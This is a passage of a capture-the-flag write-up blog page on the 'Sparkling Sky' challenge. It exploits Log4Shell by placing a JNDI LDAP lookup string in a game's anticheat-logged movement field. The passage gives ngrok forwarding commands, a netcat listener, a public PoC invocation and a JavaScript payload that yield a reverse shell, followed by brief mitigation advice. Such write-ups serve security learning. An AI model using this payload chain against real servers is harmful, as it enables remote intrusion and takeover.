+</div><p>To trigger the anticheat, we still need to bypass the <code>analyze_movement</code> function. This function calculates whether our speed exceeds a certain threshold (the speed is calculated using other data like coordinates and timestamps). If it detects suspicious movement, it will log the attempt (inserting our payload into the logs). It also interpolates the <code>angle</code> property, which is never used in <code>analyze_movement</code>, so we can set it to whatever we want. Let’s proceed with the exploit.</p>
+</blockquote>
+<h2 id="-vulnerability-analysis">🔬 Vulnerability Analysis</h2>
+<h3 id="potential-vulnerabilities">Potential Vulnerabilities</h3>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw" aria-hidden="true"></i> Log4Shell</li>
+</ul>
+</blockquote>
+<h1 id="-solution-path">🎯 Solution Path</h1>
+<h2 id="exploitation-steps">Exploitation Steps</h2>
+<h3 id="initial-setup">Initial setup</h3>
+<blockquote>
+<p>The exploit essentially relies on sending a string like <code>jndi:ldap://&lt;ip&gt;:1389/a</code> to the server to have it written in the Log4j logs. Once this is done, we will receive a connection on our previously started server, obtaining a reverse shell.</p>
+</blockquote>
+<h3 id="exploitation">Exploitation</h3>
+<blockquote>
+<p>First, I set up the port forwarding, as the <code>poc.py</code> file that exploits the vulnerability requires 3 port forwardings:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ngrok tcp <span class="m">1389</span>
+</span></span><span class="line"><span class="cl">ngrok http <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">ngrok tcp <span class="m">9001</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first port is where the <code>LDAP</code> server will be hosted, the second is for the <code>web server</code> where the string we send will retrieve the <code>java</code> exploit created by the <code>poc.py</code> file, and finally, the last port is used to receive the <code>reverse shell</code> on <code>netcat</code>. So, we also open a <code>netcat</code> session:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  nc -lvnp <span class="m">9001</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And then, I start the exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  python poc.py --userip  ngrok_link --webport <span class="m">8080</span> --lport <span class="m">9001</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Once that is done, all that’s left is to send the string to the server to insert it into the logs. This can be done by writing a Python script with a socket connection to the server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  python exploit.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Of course, in the exploit, every time it is run, the new <code>ldap</code> forwarding link created with <code>ngrok</code> must be set. This allowed me to obtain a reverse shell, and by running <code>cat flag.txt</code>, I was able to retrieve the flag.</p>
+</blockquote>
+<h1 id="-exploitation-process">🛠️ Exploitation Process</h1>
+<h2 id="approach">Approach</h2>
+<blockquote>
+<p>I used the following <a href="https://github.com/kozmer/log4j-shell-poc/" target="_blank" rel="noopener noreffer ">exploit</a>. I installed <code>openjdk-11-jdk</code> (which is also used in the challenge), then in <code>poc.py</code> I replaced all the relative paths to the JDK with the names of the binaries, which are now in the <code>PATH</code>. I ran <code>python3 poc.py --userip &lt;ip&gt; --webport 8080 --lport 9001</code>, which starts the LDAP server on port 1389 and the HTTP server on port 8080. Then, in another terminal, I started a netcat listener on port 9001 (<code>nc -lvnp 9001</code>). I performed the port forwarding for the 3 ports and ran <code>exploit.py</code>. Another way to do this was directly via the DevTools, as we have direct access to the <code>socket</code> variable in DevTools. We can interact directly with the socket. To activate the anticheat, we can send two movements with a short interval, using very different coordinates:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">socket</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="s2">&#34;move_bird&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;user_id&#34;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;angle&#34;</span><span class="o">:</span> <span class="s2">&#34;${jndi:ldap://&lt;ip\&gt;:1389/a}&#34;</span><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nx">socket</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="s2">&#34;move_bird&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;user_id&#34;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="o">:</span> <span class="mi">142142352425524</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="o">:</span> <span class="mi">4322525524</span><span class="p">,</span> <span class="s2">&#34;angle&#34;</span><span class="o">:</span> <span class="s2">&#34;${jndi:ldap://&lt;ip\&gt;:1389/a}&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><a href="/resources/SrdnlenCTF-2025/SparklingSky/exploit.py" rel=""><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;Exploit</a></li>
+<li><a href="https://github.com/kozmer/log4j-shell-poc" target="_blank" rel="noopener noreffer "><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;POC</a></li>
+</ul>
+</blockquote>
+<h1 id="-flag-capture">🚩 Flag Capture</h1>
+<blockquote>
+<div class="details admonition danger open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-skull-crossbones fa-fw" aria-hidden="true"></i>Flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="typeit"><h4 id="id-1"></h4></div>
+<blockquote>
+</blockquote>
+</div>
+        </div>
+    </div>
+</blockquote>
+<h1 id="-tools-used">🔧 Tools Used</h1>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Python</td>
+<td>Exploit</td>
+</tr>
+<tr>
+<td>Ngrok</td>
+<td>Port Forwarding</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h1 id="-technical-deep-dive">📈 Technical Deep Dive</h1>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<blockquote>
+<ul>
+<li>Type: RCE (CVE-2021-44228)</li>
+<li>CVSS Score: 10</li>
+</ul>
+</blockquote>
+<h2 id="mitigation-strategies">Mitigation Strategies</h2>
+<blockquote>
+<p>Update to the last version of log4j.</p>
+</blockquote>
+<h1 id="-key-learnings">💡 Key Learnings</h1>
+<h2 id="new-knowledge">New Knowledge</h2>
+<blockquote>
+<p>I learned how to exploit the Log4j vulnerability through the PoC.</p>
+</blockquote>
+<h2 id="skills-improved">Skills Improved</h2>
+<blockquote>
+<ul>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Binary Exploitation</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Reverse Engineering</li>
+<li><i class="far fa-check-square fa-fw" aria-hidden="true"></i> Web Exploitation</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Cryptography</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Forensics</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> OSINT</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Miscellaneous</li>
+</ul>
+</blockquote>
+<h1 id="-references--resources">📚 References &amp; Resources</h1>
+<h2 id="official-documentation">Official Documentation</h2>
+<blockquote>
+<ul>
+<li><a href="https://github.com/kozmer/log4j-shell-poc/tree/main" target="_blank" rel="noopener noreffer ">Tool Docs</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/cve-2021-44228" target="_blank" rel="noopener noreffer ">Vulnerability Info</a></li>
+</ul>
+</blockquote>
+<h2 id="learning-resources">Learning Resources</h2>
+<blockquote>
+<ul>
+<li><a href="https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/" target="_blank" rel="noopener noreffer ">https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/</a></li>
+<li><a href="https://systemoverlord.com/2022/06/20/bsidessf-2022-ctf-login4shell.html" target="_blank" rel="noopener noreffer ">https://systemoverlord.com/2022/06/20/bsidessf-2022-ctf-login4shell.html</a></li>
+<li><a href="https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-logster/" target="_blank" rel="noopener noreffer ">https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-logster/</a></li>
+<li><a href="https://www.youtube.com/watch?v=P8uOcQIE4Uk&amp;ab_channel=2bitSec" target="_blank" rel="noopener noreffer ">https://www.youtube.com/watch?v=P8uOcQIE4Uk&ab_channel=2bitSec</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/" target="_blank" rel="noopener noreffer ">https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/</a></li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="-final-statistics">📊 Final Statistics</h1>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Value</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Time to Solve</td>
+<td>00:44</td>
+<td>From start to flag</td>
+</tr>
+<tr>
+<td>Global Ranking</td>
+<td>26/1577</td>
+<td>Challenge ranking</td>
+</tr>
+<tr>
+<td>Points Earned</td>
+<td>500</td>
+<td>Team contribution</td>
+</tr>
+</tbody>
+</table>
+<p><em>Created: 19-01-2025 • Last Modified: 19-01-2025</em>
+<em>Author: mH4ck3r0n3 • Team: Team Aetruria</em></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 05/02/2025</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2025/02/05/sparkling-sky/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" data-title="🌐 Sparkling Sky" data-hashtags="⚠️ CVE-2021-44228 (Log4Shell),📜 Log4j,🌐 Web Security"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" data-hashtag="⚠️ CVE-2021-44228 (Log4Shell)"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" data-title="🌐 Sparkling Sky" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" data-title="🌐 Sparkling Sky"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" data-title="🌐 Sparkling Sky"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" data-title="🌐 Sparkling Sky"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%EF%B8%8F-cve-2021-44228-log4shell/">⚠️ CVE-2021-44228 (Log4Shell)</a>,&nbsp;<a href="/tags/log4j/">📜 Log4j</a>,&nbsp;<a href="/tags/web-security/">🌐 Web Security</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+
+    <div class="post-nav"><a href="/posts/2025/02/05/average-http/3-enjoyer/" class="prev" rel="prev" title="🌐 Average HTTP/3 Enjoyer"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>🌐 Average HTTP/3 Enjoyer</a></div>
+</div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://mh4ck3r0n3.github.io/" target="_blank">mH4ck3r0n3</a></span>&nbsp;|&nbsp;<span class="license"><a rel="This is free and unencumbered software released into the public domain." href="https://unlicense.org" target="_blank">The Unlicense</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"srdnlen{I_th1nk_h3_r34lly_m3ss3d_up}","id-2":"mH4ck3r0n3","id-3":"mH4ck3r0n3"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"RYTH4NIP8Z","algoliaIndex":"mh4ck3r0n3_github_io_ryth4nip8z_articles","algoliaSearchKey":"5288bb44022269be805c2b51c80976df","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":100,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"],"id-3":["id-3"]},"duration":-1,"speed":70}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-597RCC8B41', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-597RCC8B41" async></script></body>
+</html>
